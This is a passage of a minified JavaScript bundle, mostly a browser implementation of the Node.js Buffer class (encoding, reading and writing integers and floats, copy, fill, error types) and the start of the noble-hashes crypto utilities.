                    Ot !== -1 && (Ct -= Ct - Ot),
                    Ot = -1
        } else
            for (Ue + gt > ft && (Ue = ft - gt),
            Ct = Ue; Ct >= 0; Ct--) {
                let Ot = !0;
                for (let Vt = 0; Vt < gt; Vt++)
                    if (Yt(ke, Ct + Vt) !== Yt(Me, Vt)) {
                        Ot = !1;
                        break
                    }
                if (Ot)
                    return Ct
            }
        return -1
    }
    V.prototype.includes = function(Me, Ue, rt) {
        return this.indexOf(Me, Ue, rt) !== -1
    }
    ,
    V.prototype.indexOf = function(Me, Ue, rt) {
        return Ee(this, Me, Ue, rt, !0)
    }
    ,
    V.prototype.lastIndexOf = function(Me, Ue, rt) {
        return Ee(this, Me, Ue, rt, !1)
    }
    ;
    function ce(ke, Me, Ue, rt) {
        Ue = Number(Ue) || 0;
        const dt = ke.length - Ue;
        rt ? (rt = Number(rt),
        rt > dt && (rt = dt)) : rt = dt;
        const Et = Me.length;
        rt > Et / 2 && (rt = Et / 2);
        let ft;
        for (ft = 0; ft < rt; ++ft) {
            const gt = parseInt(Me.substr(ft * 2, 2), 16);
            if (st(gt))
                return ft;
            ke[Ue + ft] = gt
        }
        return ft
    }
    function q(ke, Me, Ue, rt) {
        return _e(mt(Me, ke.length - Ue), ke, Ue, rt)
    }
    function L(ke, Me, Ue, rt) {
        return _e(ct(Me), ke, Ue, rt)
    }
    function U(ke, Me, Ue, rt) {
        return _e(we(Me), ke, Ue, rt)
    }
    function Z(ke, Me, Ue, rt) {
        return _e(vt(Me, ke.length - Ue), ke, Ue, rt)
    }
    V.prototype.write = function(Me, Ue, rt, dt) {
        if (Ue === void 0)
            dt = "utf8",
            rt = this.length,
            Ue = 0;
        else if (rt === void 0 && typeof Ue == "string")
            dt = Ue,
            rt = this.length,
            Ue = 0;
        else if (isFinite(Ue))
            Ue = Ue >>> 0,
            isFinite(rt) ? (rt = rt >>> 0,
            dt === void 0 && (dt = "utf8")) : (dt = rt,
            rt = void 0);
        else
            throw new Error("Buffer.write(string, encoding, offset[, length]) is no longer supported");
        const Et = this.length - Ue;
        if ((rt === void 0 || rt > Et) && (rt = Et),
        Me.length > 0 && (rt < 0 || Ue < 0) || Ue > this.length)
            throw new RangeError("Attempt to write outside buffer bounds");
        dt || (dt = "utf8");
        let ft = !1;
        for (; ; )
            switch (dt) {
            case "hex":
                return ce(this, Me, Ue, rt);
            case "utf8":
            case "utf-8":
                return q(this, Me, Ue, rt);
            case "ascii":
            case "latin1":
            case "binary":
                return L(this, Me, Ue, rt);
            case "base64":
                return U(this, Me, Ue, rt);
            case "ucs2":
            case "ucs-2":
            case "utf16le":
            case "utf-16le":
                return Z(this, Me, Ue, rt);
            default:
                if (ft)
                    throw new TypeError("Unknown encoding: " + dt);
                dt = ("" + dt).toLowerCase(),
                ft = !0
            }
    }
    ,
    V.prototype.toJSON = function() {
        return {
            type: "Buffer",
            data: Array.prototype.slice.call(this._arr || this, 0)
        }
    }
    ;
    function te(ke, Me, Ue) {
        return Me === 0 && Ue === ke.length ? M.fromByteArray(ke) : M.fromByteArray(ke.slice(Me, Ue))
    }
    function se(ke, Me, Ue) {
        Ue = Math.min(ke.length, Ue);
        const rt = [];
        let dt = Me;
        for (; dt < Ue; ) {
            const Et = ke[dt];
            let ft = null
              , gt = Et > 239 ? 4 : Et > 223 ? 3 : Et > 191 ? 2 : 1;
            if (dt + gt <= Ue) {
                let Yt, Ct, Ot, Vt;
                switch (gt) {
                case 1:
                    Et < 128 && (ft = Et);
                    break;
                case 2:
                    Yt = ke[dt + 1],
                    (Yt & 192) === 128 && (Vt = (Et & 31) << 6 | Yt & 63,
                    Vt > 127 && (ft = Vt));
                    break;
                case 3:
                    Yt = ke[dt + 1],
                    Ct = ke[dt + 2],
                    (Yt & 192) === 128 && (Ct & 192) === 128 && (Vt = (Et & 15) << 12 | (Yt & 63) << 6 | Ct & 63,
                    Vt > 2047 && (Vt < 55296 || Vt > 57343) && (ft = Vt));
                    break;
                case 4:
                    Yt = ke[dt + 1],
                    Ct = ke[dt + 2],
                    Ot = ke[dt + 3],
                    (Yt & 192) === 128 && (Ct & 192) === 128 && (Ot & 192) === 128 && (Vt = (Et & 15) << 18 | (Yt & 63) << 12 | (Ct & 63) << 6 | Ot & 63,
                    Vt > 65535 && Vt < 1114112 && (ft = Vt))
                }
            }
            ft === null ? (ft = 65533,
            gt = 1) : ft > 65535 && (ft -= 65536,
            rt.push(ft >>> 10 & 1023 | 55296),
            ft = 56320 | ft & 1023),
            rt.push(ft),
            dt += gt
        }
        return re(rt)
    }
    const de = 4096;
    function re(ke) {
        const Me = ke.length;
        if (Me <= de)
            return String.fromCharCode.apply(String, ke);
        let Ue = ""
          , rt = 0;
        for (; rt < Me; )
            Ue += String.fromCharCode.apply(String, ke.slice(rt, rt += de));
        return Ue
    }
    function $(ke, Me, Ue) {
        let rt = "";
        Ue = Math.min(ke.length, Ue);
        for (let dt = Me; dt < Ue; ++dt)
            rt += String.fromCharCode(ke[dt] & 127);
        return rt
    }
    function ie(ke, Me, Ue) {
        let rt = "";
        Ue = Math.min(ke.length, Ue);
        for (let dt = Me; dt < Ue; ++dt)
            rt += String.fromCharCode(ke[dt]);
        return rt
    }
    function ve(ke, Me, Ue) {
        const rt = ke.length;
        (!Me || Me < 0) && (Me = 0),
        (!Ue || Ue < 0 || Ue > rt) && (Ue = rt);
        let dt = "";
        for (let Et = Me; Et < Ue; ++Et)
            dt += et[ke[Et]];
        return dt
    }
    function ge(ke, Me, Ue) {
        const rt = ke.slice(Me, Ue);
        let dt = "";
        for (let Et = 0; Et < rt.length - 1; Et += 2)
            dt += String.fromCharCode(rt[Et] + rt[Et + 1] * 256);
        return dt
    }
    V.prototype.slice = function(Me, Ue) {
        const rt = this.length;
        Me = ~~Me,
        Ue = Ue === void 0 ? rt : ~~Ue,
        Me < 0 ? (Me += rt,
        Me < 0 && (Me = 0)) : Me > rt && (Me = rt),
        Ue < 0 ? (Ue += rt,
        Ue < 0 && (Ue = 0)) : Ue > rt && (Ue = rt),
        Ue < Me && (Ue = Me);
        const dt = this.subarray(Me, Ue);
        return Object.setPrototypeOf(dt, V.prototype),
        dt
    }
    ;
    function Re(ke, Me, Ue) {
        if (ke % 1 !== 0 || ke < 0)
            throw new RangeError("offset is not uint");
        if (ke + Me > Ue)
            throw new RangeError("Trying to access beyond buffer length")
    }
    V.prototype.readUintLE = V.prototype.readUIntLE = function(Me, Ue, rt) {
        Me = Me >>> 0,
        Ue = Ue >>> 0,
        rt || Re(Me, Ue, this.length);
        let dt = this[Me]
          , Et = 1
          , ft = 0;
        for (; ++ft < Ue && (Et *= 256); )
            dt += this[Me + ft] * Et;
        return dt
    }
    ,
    V.prototype.readUintBE = V.prototype.readUIntBE = function(Me, Ue, rt) {
        Me = Me >>> 0,
        Ue = Ue >>> 0,
        rt || Re(Me, Ue, this.length);
        let dt = this[Me + --Ue]
          , Et = 1;
        for (; Ue > 0 && (Et *= 256); )
            dt += this[Me + --Ue] * Et;
        return dt
    }
    ,
    V.prototype.readUint8 = V.prototype.readUInt8 = function(Me, Ue) {
        return Me = Me >>> 0,
        Ue || Re(Me, 1, this.length),
        this[Me]
    }
    ,
    V.prototype.readUint16LE = V.prototype.readUInt16LE = function(Me, Ue) {
        return Me = Me >>> 0,
        Ue || Re(Me, 2, this.length),
        this[Me] | this[Me + 1] << 8
    }
    ,
    V.prototype.readUint16BE = V.prototype.readUInt16BE = function(Me, Ue) {
        return Me = Me >>> 0,
        Ue || Re(Me, 2, this.length),
        this[Me] << 8 | this[Me + 1]
    }
    ,
    V.prototype.readUint32LE = V.prototype.readUInt32LE = function(Me, Ue) {
        return Me = Me >>> 0,
        Ue || Re(Me, 4, this.length),
        (this[Me] | this[Me + 1] << 8 | this[Me + 2] << 16) + this[Me + 3] * 16777216
    }
    ,
    V.prototype.readUint32BE = V.prototype.readUInt32BE = function(Me, Ue) {
        return Me = Me >>> 0,
        Ue || Re(Me, 4, this.length),
        this[Me] * 16777216 + (this[Me + 1] << 16 | this[Me + 2] << 8 | this[Me + 3])
    }
    ,
    V.prototype.readBigUInt64LE = tt(function(Me) {
        Me = Me >>> 0,
        je(Me, "offset");
        const Ue = this[Me]
          , rt = this[Me + 7];
        (Ue === void 0 || rt === void 0) && Ke(Me, this.length - 8);
        const dt = Ue + this[++Me] * 2 ** 8 + this[++Me] * 2 ** 16 + this[++Me] * 2 ** 24
          , Et = this[++Me] + this[++Me] * 2 ** 8 + this[++Me] * 2 ** 16 + rt * 2 ** 24;
        return BigInt(dt) + (BigInt(Et) << BigInt(32))
    }),
    V.prototype.readBigUInt64BE = tt(function(Me) {
        Me = Me >>> 0,
        je(Me, "offset");
        const Ue = this[Me]
          , rt = this[Me + 7];
        (Ue === void 0 || rt === void 0) && Ke(Me, this.length - 8);
        const dt = Ue * 2 ** 24 + this[++Me] * 2 ** 16 + this[++Me] * 2 ** 8 + this[++Me]
          , Et = this[++Me] * 2 ** 24 + this[++Me] * 2 ** 16 + this[++Me] * 2 ** 8 + rt;
        return (BigInt(dt) << BigInt(32)) + BigInt(Et)
    }),
    V.prototype.readIntLE = function(Me, Ue, rt) {
        Me = Me >>> 0,
        Ue = Ue >>> 0,
        rt || Re(Me, Ue, this.length);
        let dt = this[Me]
          , Et = 1
          , ft = 0;
        for (; ++ft < Ue && (Et *= 256); )
            dt += this[Me + ft] * Et;
        return Et *= 128,
        dt >= Et && (dt -= Math.pow(2, 8 * Ue)),
        dt
    }
    ,
    V.prototype.readIntBE = function(Me, Ue, rt) {
        Me = Me >>> 0,
        Ue = Ue >>> 0,
        rt || Re(Me, Ue, this.length);
        let dt = Ue
          , Et = 1
          , ft = this[Me + --dt];
        for (; dt > 0 && (Et *= 256); )
            ft += this[Me + --dt] * Et;
        return Et *= 128,
        ft >= Et && (ft -= Math.pow(2, 8 * Ue)),
        ft
    }
    ,
    V.prototype.readInt8 = function(Me, Ue) {
        return Me = Me >>> 0,
        Ue || Re(Me, 1, this.length),
        this[Me] & 128 ? (255 - this[Me] + 1) * -1 : this[Me]
    }
    ,
    V.prototype.readInt16LE = function(Me, Ue) {
        Me = Me >>> 0,
        Ue || Re(Me, 2, this.length);
        const rt = this[Me] | this[Me + 1] << 8;
        return rt & 32768 ? rt | 4294901760 : rt
    }
    ,
    V.prototype.readInt16BE = function(Me, Ue) {
        Me = Me >>> 0,
        Ue || Re(Me, 2, this.length);
        const rt = this[Me + 1] | this[Me] << 8;
        return rt & 32768 ? rt | 4294901760 : rt
    }
    ,
    V.prototype.readInt32LE = function(Me, Ue) {
        return Me = Me >>> 0,
        Ue || Re(Me, 4, this.length),
        this[Me] | this[Me + 1] << 8 | this[Me + 2] << 16 | this[Me + 3] << 24
    }
    ,
    V.prototype.readInt32BE = function(Me, Ue) {
        return Me = Me >>> 0,
        Ue || Re(Me, 4, this.length),
        this[Me] << 24 | this[Me + 1] << 16 | this[Me + 2] << 8 | this[Me + 3]
    }
    ,
    V.prototype.readBigInt64LE = tt(function(Me) {
        Me = Me >>> 0,
        je(Me, "offset");
        const Ue = this[Me]
          , rt = this[Me + 7];
        (Ue === void 0 || rt === void 0) && Ke(Me, this.length - 8);
        const dt = this[Me + 4] + this[Me + 5] * 2 ** 8 + this[Me + 6] * 2 ** 16 + (rt << 24);
        return (BigInt(dt) << BigInt(32)) + BigInt(Ue + this[++Me] * 2 ** 8 + this[++Me] * 2 ** 16 + this[++Me] * 2 ** 24)
    }),
    V.prototype.readBigInt64BE = tt(function(Me) {
        Me = Me >>> 0,
        je(Me, "offset");
        const Ue = this[Me]
          , rt = this[Me + 7];
        (Ue === void 0 || rt === void 0) && Ke(Me, this.length - 8);
        const dt = (Ue << 24) + this[++Me] * 2 ** 16 + this[++Me] * 2 ** 8 + this[++Me];
        return (BigInt(dt) << BigInt(32)) + BigInt(this[++Me] * 2 ** 24 + this[++Me] * 2 ** 16 + this[++Me] * 2 ** 8 + rt)
    }),
    V.prototype.readFloatLE = function(Me, Ue) {
        return Me = Me >>> 0,
        Ue || Re(Me, 4, this.length),
        j.read(this, Me, !0, 23, 4)
    }
    ,
    V.prototype.readFloatBE = function(Me, Ue) {
        return Me = Me >>> 0,
        Ue || Re(Me, 4, this.length),
        j.read(this, Me, !1, 23, 4)
    }
    ,
    V.prototype.readDoubleLE = function(Me, Ue) {
        return Me = Me >>> 0,
        Ue || Re(Me, 8, this.length),
        j.read(this, Me, !0, 52, 8)
    }
    ,
    V.prototype.readDoubleBE = function(Me, Ue) {
        return Me = Me >>> 0,
        Ue || Re(Me, 8, this.length),
        j.read(this, Me, !1, 52, 8)
    }
    ;
    function Pe(ke, Me, Ue, rt, dt, Et) {
        if (!V.isBuffer(ke))
            throw new TypeError('"buffer" argument must be a Buffer instance');
        if (Me > dt || Me < Et)
            throw new RangeError('"value" argument is out of bounds');
        if (Ue + rt > ke.length)
            throw new RangeError("Index out of range")
    }
    V.prototype.writeUintLE = V.prototype.writeUIntLE = function(Me, Ue, rt, dt) {
        if (Me = +Me,
        Ue = Ue >>> 0,
        rt = rt >>> 0,
        !dt) {
            const gt = Math.pow(2, 8 * rt) - 1;
            Pe(this, Me, Ue, rt, gt, 0)
        }
        let Et = 1
          , ft = 0;
        for (this[Ue] = Me & 255; ++ft < rt && (Et *= 256); )
            this[Ue + ft] = Me / Et & 255;
        return Ue + rt
    }
    ,
    V.prototype.writeUintBE = V.prototype.writeUIntBE = function(Me, Ue, rt, dt) {
        if (Me = +Me,
        Ue = Ue >>> 0,
        rt = rt >>> 0,
        !dt) {
            const gt = Math.pow(2, 8 * rt) - 1;
            Pe(this, Me, Ue, rt, gt, 0)
        }
        let Et = rt - 1
          , ft = 1;
        for (this[Ue + Et] = Me & 255; --Et >= 0 && (ft *= 256); )
            this[Ue + Et] = Me / ft & 255;
        return Ue + rt
    }
    ,
    V.prototype.writeUint8 = V.prototype.writeUInt8 = function(Me, Ue, rt) {
        return Me = +Me,
        Ue = Ue >>> 0,
        rt || Pe(this, Me, Ue, 1, 255, 0),
        this[Ue] = Me & 255,
        Ue + 1
    }
    ,
    V.prototype.writeUint16LE = V.prototype.writeUInt16LE = function(Me, Ue, rt) {
        return Me = +Me,
        Ue = Ue >>> 0,
        rt || Pe(this, Me, Ue, 2, 65535, 0),
        this[Ue] = Me & 255,
        this[Ue + 1] = Me >>> 8,
        Ue + 2
    }
    ,
    V.prototype.writeUint16BE = V.prototype.writeUInt16BE = function(Me, Ue, rt) {
        return Me = +Me,
        Ue = Ue >>> 0,
        rt || Pe(this, Me, Ue, 2, 65535, 0),
        this[Ue] = Me >>> 8,
        this[Ue + 1] = Me & 255,
        Ue + 2
    }
    ,
    V.prototype.writeUint32LE = V.prototype.writeUInt32LE = function(Me, Ue, rt) {
        return Me = +Me,
        Ue = Ue >>> 0,
        rt || Pe(this, Me, Ue, 4, 4294967295, 0),
        this[Ue + 3] = Me >>> 24,
        this[Ue + 2] = Me >>> 16,
        this[Ue + 1] = Me >>> 8,
        this[Ue] = Me & 255,
        Ue + 4
    }
    ,
    V.prototype.writeUint32BE = V.prototype.writeUInt32BE = function(Me, Ue, rt) {
        return Me = +Me,
        Ue = Ue >>> 0,
        rt || Pe(this, Me, Ue, 4, 4294967295, 0),
        this[Ue] = Me >>> 24,
        this[Ue + 1] = Me >>> 16,
        this[Ue + 2] = Me >>> 8,
        this[Ue + 3] = Me & 255,
        Ue + 4
    }
    ;
    function Ie(ke, Me, Ue, rt, dt) {
        nt(Me, rt, dt, ke, Ue, 7);
        let Et = Number(Me & BigInt(4294967295));
        ke[Ue++] = Et,
        Et = Et >> 8,
        ke[Ue++] = Et,
        Et = Et >> 8,
        ke[Ue++] = Et,
        Et = Et >> 8,
        ke[Ue++] = Et;
        let ft = Number(Me >> BigInt(32) & BigInt(4294967295));
        return ke[Ue++] = ft,
        ft = ft >> 8,
        ke[Ue++] = ft,
        ft = ft >> 8,
        ke[Ue++] = ft,
        ft = ft >> 8,
        ke[Ue++] = ft,
        Ue
    }
    function Te(ke, Me, Ue, rt, dt) {
        nt(Me, rt, dt, ke, Ue, 7);
        let Et = Number(Me & BigInt(4294967295));
        ke[Ue + 7] = Et,
        Et = Et >> 8,
        ke[Ue + 6] = Et,
        Et = Et >> 8,
        ke[Ue + 5] = Et,
        Et = Et >> 8,
        ke[Ue + 4] = Et;
        let ft = Number(Me >> BigInt(32) & BigInt(4294967295));
        return ke[Ue + 3] = ft,
        ft = ft >> 8,
        ke[Ue + 2] = ft,
        ft = ft >> 8,
        ke[Ue + 1] = ft,
        ft = ft >> 8,
        ke[Ue] = ft,
        Ue + 8
    }
    V.prototype.writeBigUInt64LE = tt(function(Me, Ue=0) {
        return Ie(this, Me, Ue, BigInt(0), BigInt("0xffffffffffffffff"))
    }),
    V.prototype.writeBigUInt64BE = tt(function(Me, Ue=0) {
        return Te(this, Me, Ue, BigInt(0), BigInt("0xffffffffffffffff"))
    }),
    V.prototype.writeIntLE = function(Me, Ue, rt, dt) {
        if (Me = +Me,
        Ue = Ue >>> 0,
        !dt) {
            const Yt = Math.pow(2, 8 * rt - 1);
            Pe(this, Me, Ue, rt, Yt - 1, -Yt)
        }
        let Et = 0
          , ft = 1
          , gt = 0;
        for (this[Ue] = Me & 255; ++Et < rt && (ft *= 256); )
            Me < 0 && gt === 0 && this[Ue + Et - 1] !== 0 && (gt = 1),
            this[Ue + Et] = (Me / ft >> 0) - gt & 255;
        return Ue + rt
    }
    ,
    V.prototype.writeIntBE = function(Me, Ue, rt, dt) {
        if (Me = +Me,
        Ue = Ue >>> 0,
        !dt) {
            const Yt = Math.pow(2, 8 * rt - 1);
            Pe(this, Me, Ue, rt, Yt - 1, -Yt)
        }
        let Et = rt - 1
          , ft = 1
          , gt = 0;
        for (this[Ue + Et] = Me & 255; --Et >= 0 && (ft *= 256); )
            Me < 0 && gt === 0 && this[Ue + Et + 1] !== 0 && (gt = 1),
            this[Ue + Et] = (Me / ft >> 0) - gt & 255;
        return Ue + rt
    }
    ,
    V.prototype.writeInt8 = function(Me, Ue, rt) {
        return Me = +Me,
        Ue = Ue >>> 0,
        rt || Pe(this, Me, Ue, 1, 127, -128),
        Me < 0 && (Me = 255 + Me + 1),
        this[Ue] = Me & 255,
        Ue + 1
    }
    ,
    V.prototype.writeInt16LE = function(Me, Ue, rt) {
        return Me = +Me,
        Ue = Ue >>> 0,
        rt || Pe(this, Me, Ue, 2, 32767, -32768),
        this[Ue] = Me & 255,
        this[Ue + 1] = Me >>> 8,
        Ue + 2
    }
    ,
    V.prototype.writeInt16BE = function(Me, Ue, rt) {
        return Me = +Me,
        Ue = Ue >>> 0,
        rt || Pe(this, Me, Ue, 2, 32767, -32768),
        this[Ue] = Me >>> 8,
        this[Ue + 1] = Me & 255,
        Ue + 2
    }
    ,
    V.prototype.writeInt32LE = function(Me, Ue, rt) {
        return Me = +Me,
        Ue = Ue >>> 0,
        rt || Pe(this, Me, Ue, 4, 2147483647, -2147483648),
        this[Ue] = Me & 255,
        this[Ue + 1] = Me >>> 8,
        this[Ue + 2] = Me >>> 16,
        this[Ue + 3] = Me >>> 24,
        Ue + 4
    }
    ,
    V.prototype.writeInt32BE = function(Me, Ue, rt) {
        return Me = +Me,
        Ue = Ue >>> 0,
        rt || Pe(this, Me, Ue, 4, 2147483647, -2147483648),
        Me < 0 && (Me = 4294967295 + Me + 1),
        this[Ue] = Me >>> 24,
        this[Ue + 1] = Me >>> 16,
        this[Ue + 2] = Me >>> 8,
        this[Ue + 3] = Me & 255,
        Ue + 4
    }
    ,
    V.prototype.writeBigInt64LE = tt(function(Me, Ue=0) {
        return Ie(this, Me, Ue, -BigInt("0x8000000000000000"), BigInt("0x7fffffffffffffff"))
    }),
    V.prototype.writeBigInt64BE = tt(function(Me, Ue=0) {
        return Te(this, Me, Ue, -BigInt("0x8000000000000000"), BigInt("0x7fffffffffffffff"))
    });
    function Le(ke, Me, Ue, rt, dt, Et) {
        if (Ue + rt > ke.length)
            throw new RangeError("Index out of range");
        if (Ue < 0)
            throw new RangeError("Index out of range")
    }
    function Ze(ke, Me, Ue, rt, dt) {
        return Me = +Me,
        Ue = Ue >>> 0,
        dt || Le(ke, Me, Ue, 4),
        j.write(ke, Me, Ue, rt, 23, 4),
        Ue + 4
    }
    V.prototype.writeFloatLE = function(Me, Ue, rt) {
        return Ze(this, Me, Ue, !0, rt)
    }
    ,
    V.prototype.writeFloatBE = function(Me, Ue, rt) {
        return Ze(this, Me, Ue, !1, rt)
    }
    ;
    function $e(ke, Me, Ue, rt, dt) {
        return Me = +Me,
        Ue = Ue >>> 0,
        dt || Le(ke, Me, Ue, 8),
        j.write(ke, Me, Ue, rt, 52, 8),
        Ue + 8
    }
    V.prototype.writeDoubleLE = function(Me, Ue, rt) {
        return $e(this, Me, Ue, !0, rt)
    }
    ,
    V.prototype.writeDoubleBE = function(Me, Ue, rt) {
        return $e(this, Me, Ue, !1, rt)
    }
    ,
    V.prototype.copy = function(Me, Ue, rt, dt) {
        if (!V.isBuffer(Me))
            throw new TypeError("argument should be a Buffer");
        if (rt || (rt = 0),
        !dt && dt !== 0 && (dt = this.length),
        Ue >= Me.length && (Ue = Me.length),
        Ue || (Ue = 0),
        dt > 0 && dt < rt && (dt = rt),
        dt === rt || Me.length === 0 || this.length === 0)
            return 0;
        if (Ue < 0)
            throw new RangeError("targetStart out of bounds");
        if (rt < 0 || rt >= this.length)
            throw new RangeError("Index out of range");
        if (dt < 0)
            throw new RangeError("sourceEnd out of bounds");
        dt > this.length && (dt = this.length),
        Me.length - Ue < dt - rt && (dt = Me.length - Ue + rt);
        const Et = dt - rt;
        return this === Me && typeof w.prototype.copyWithin == "function" ? this.copyWithin(Ue, rt, dt) : w.prototype.set.call(Me, this.subarray(rt, dt), Ue),
        Et
    }
    ,
    V.prototype.fill = function(Me, Ue, rt, dt) {
        if (typeof Me == "string") {
            if (typeof Ue == "string" ? (dt = Ue,
            Ue = 0,
            rt = this.length) : typeof rt == "string" && (dt = rt,
            rt = this.length),
            dt !== void 0 && typeof dt != "string")
                throw new TypeError("encoding must be a string");
            if (typeof dt == "string" && !V.isEncoding(dt))
                throw new TypeError("Unknown encoding: " + dt);
            if (Me.length === 1) {
                const ft = Me.charCodeAt(0);
                (dt === "utf8" && ft < 128 || dt === "latin1") && (Me = ft)
            }
        } else
            typeof Me == "number" ? Me = Me & 255 : typeof Me == "boolean" && (Me = Number(Me));
        if (Ue < 0 || this.length < Ue || this.length < rt)
            throw new RangeError("Out of range index");
        if (rt <= Ue)
            return this;
        Ue = Ue >>> 0,
        rt = rt === void 0 ? this.length : rt >>> 0,
        Me || (Me = 0);
        let Et;
        if (typeof Me == "number")
            for (Et = Ue; Et < rt; ++Et)
                this[Et] = Me;
        else {
            const ft = V.isBuffer(Me) ? Me : V.from(Me, dt)
              , gt = ft.length;
            if (gt === 0)
                throw new TypeError('The value "' + Me + '" is invalid for argument "value"');
            for (Et = 0; Et < rt - Ue; ++Et)
                this[Et + Ue] = ft[Et % gt]
        }
        return this
    }
    ;
    const Ne = {};
    function qe(ke, Me, Ue) {
        Ne[ke] = class extends Ue {
            constructor() {
                super(),
                Object.defineProperty(this, "message", {
                    value: Me.apply(this, arguments),
                    writable: !0,
                    configurable: !0
                }),
                this.name = `${this.name} [${ke}]`,
                this.stack,
                delete this.name
            }
            get code() {
                return ke
            }
            set code(dt) {
                Object.defineProperty(this, "code", {
                    configurable: !0,
                    enumerable: !0,
                    value: dt,
                    writable: !0
                })
            }
            toString() {
                return `${this.name} [${ke}]: ${this.message}`
            }
        }
    }
    qe("ERR_BUFFER_OUT_OF_BOUNDS", function(ke) {
        return ke ? `${ke} is outside of buffer bounds` : "Attempt to access memory outside buffer bounds"
    }, RangeError),
    qe("ERR_INVALID_ARG_TYPE", function(ke, Me) {
        return `The "${ke}" argument must be of type number. Received type ${typeof Me}`
    }, TypeError),
    qe("ERR_OUT_OF_RANGE", function(ke, Me, Ue) {
        let rt = `The value of "${ke}" is out of range.`
          , dt = Ue;
        return Number.isInteger(Ue) && Math.abs(Ue) > 2 ** 32 ? dt = Ve(String(Ue)) : typeof Ue == "bigint" && (dt = String(Ue),
        (Ue > BigInt(2) ** BigInt(32) || Ue < -(BigInt(2) ** BigInt(32))) && (dt = Ve(dt)),
        dt += "n"),
        rt += ` It must be ${Me}. Received ${dt}`,
        rt
    }, RangeError);
    function Ve(ke) {
        let Me = ""
          , Ue = ke.length;
        const rt = ke[0] === "-" ? 1 : 0;
        for (; Ue >= rt + 4; Ue -= 3)
            Me = `_${ke.slice(Ue - 3, Ue)}${Me}`;
        return `${ke.slice(0, Ue)}${Me}`
    }
    function lt(ke, Me, Ue) {
        je(Me, "offset"),
        (ke[Me] === void 0 || ke[Me + Ue] === void 0) && Ke(Me, ke.length - (Ue + 1))
    }
    function nt(ke, Me, Ue, rt, dt, Et) {
        if (ke > Ue || ke < Me) {
            const ft = typeof Me == "bigint" ? "n" : "";
            let gt;
            throw Me === 0 || Me === BigInt(0) ? gt = `>= 0${ft} and < 2${ft} ** ${(Et + 1) * 8}${ft}` : gt = `>= -(2${ft} ** ${(Et + 1) * 8 - 1}${ft}) and < 2 ** ${(Et + 1) * 8 - 1}${ft}`,
            new Ne.ERR_OUT_OF_RANGE("value",gt,ke)
        }
        lt(rt, dt, Et)
    }
    function je(ke, Me) {
        if (typeof ke != "number")
            throw new Ne.ERR_INVALID_ARG_TYPE(Me,"number",ke)
    }
    function Ke(ke, Me, Ue) {
        throw Math.floor(ke) !== ke ? (je(ke, Ue),
        new Ne.ERR_OUT_OF_RANGE("offset","an integer",ke)) : Me < 0 ? new Ne.ERR_BUFFER_OUT_OF_BOUNDS : new Ne.ERR_OUT_OF_RANGE("offset",`>= 0 and <= ${Me}`,ke)
    }
    const Qe = /[^+/0-9A-Za-z-_]/g;
    function We(ke) {
        if (ke = ke.split("=")[0],
        ke = ke.trim().replace(Qe, ""),
        ke.length < 2)
            return "";
        for (; ke.length % 4 !== 0; )
            ke = ke + "=";
        return ke
    }
    function mt(ke, Me) {
        Me = Me || 1 / 0;
        let Ue;
        const rt = ke.length;
        let dt = null;
        const Et = [];
        for (let ft = 0; ft < rt; ++ft) {
            if (Ue = ke.charCodeAt(ft),
            Ue > 55295 && Ue < 57344) {
                if (!dt) {
                    if (Ue > 56319) {
                        (Me -= 3) > -1 && Et.push(239, 191, 189);
                        continue
                    } else if (ft + 1 === rt) {
                        (Me -= 3) > -1 && Et.push(239, 191, 189);
                        continue
                    }
                    dt = Ue;
                    continue
                }
                if (Ue < 56320) {
                    (Me -= 3) > -1 && Et.push(239, 191, 189),
                    dt = Ue;
                    continue
                }
                Ue = (dt - 55296 << 10 | Ue - 56320) + 65536
            } else
                dt && (Me -= 3) > -1 && Et.push(239, 191, 189);
            if (dt = null,
            Ue < 128) {
                if ((Me -= 1) < 0)
                    break;
                Et.push(Ue)
            } else if (Ue < 2048) {
                if ((Me -= 2) < 0)
                    break;
                Et.push(Ue >> 6 | 192, Ue & 63 | 128)
            } else if (Ue < 65536) {
                if ((Me -= 3) < 0)
                    break;
                Et.push(Ue >> 12 | 224, Ue >> 6 & 63 | 128, Ue & 63 | 128)
            } else if (Ue < 1114112) {
                if ((Me -= 4) < 0)
                    break;
                Et.push(Ue >> 18 | 240, Ue >> 12 & 63 | 128, Ue >> 6 & 63 | 128, Ue & 63 | 128)
            } else
                throw new Error("Invalid code point")
        }
        return Et
    }
    function ct(ke) {
        const Me = [];
        for (let Ue = 0; Ue < ke.length; ++Ue)
            Me.push(ke.charCodeAt(Ue) & 255);
        return Me
    }
    function vt(ke, Me) {
        let Ue, rt, dt;
        const Et = [];
        for (let ft = 0; ft < ke.length && !((Me -= 2) < 0); ++ft)
            Ue = ke.charCodeAt(ft),
            rt = Ue >> 8,
            dt = Ue % 256,
            Et.push(dt),
            Et.push(rt);
        return Et
    }
    function we(ke) {
        return M.toByteArray(We(ke))
    }
    function _e(ke, Me, Ue, rt) {
        let dt;
        for (dt = 0; dt < rt && !(dt + Ue >= Me.length || dt >= ke.length); ++dt)
            Me[dt + Ue] = ke[dt];
        return dt
    }
    function Ce(ke, Me) {
        return ke instanceof Me || ke != null && ke.constructor != null && ke.constructor.name != null && ke.constructor.name === Me.name
    }
    function st(ke) {
        return ke !== ke
    }
    const et = function() {
        const ke = "0123456789abcdef"
          , Me = new Array(256);
        for (let Ue = 0; Ue < 16; ++Ue) {
            const rt = Ue * 16;
            for (let dt = 0; dt < 16; ++dt)
                Me[rt + dt] = ke[Ue] + ke[dt]
        }
        return Me
    }();
    function tt(ke) {
        return typeof BigInt > "u" ? He : ke
    }
    function He() {
        throw new Error("BigInt not supported")
    }
}
)(buffer$1);
const Buffer = buffer$1.Buffer
  , Buffer$1 = buffer$1.Buffer;
var src = {}, sha256$2 = {}, sha2 = {}, _md = {}, utils$a = {}, crypto$1 = {}, hasRequiredCrypto;
function requireCrypto() {
    return hasRequiredCrypto || (hasRequiredCrypto = 1,
    Object.defineProperty(crypto$1, "__esModule", {
        value: !0
    }),
    crypto$1.crypto = void 0,
    crypto$1.crypto = typeof globalThis == "object" && "crypto"in globalThis ? globalThis.crypto : void 0),
    crypto$1
}
var hasRequiredUtils$8;
function requireUtils$8() {
    return hasRequiredUtils$8 || (hasRequiredUtils$8 = 1,
    function(_) {
        /*! noble-hashes - MIT License (c) 2022 Paul Miller (paulmillr.com) */
        Object.defineProperty(_, "__esModule", {
            value: !0
        }),
        _.wrapXOFConstructorWithOpts = _.wrapConstructorWithOpts = _.wrapConstructor = _.Hash = _.nextTick = _.swap32IfBE = _.byteSwapIfBE = _.swap8IfBE = _.isLE = void 0,
        _.isBytes = j,
        _.anumber = O,
        _.abytes = x,
        _.ahash = w,
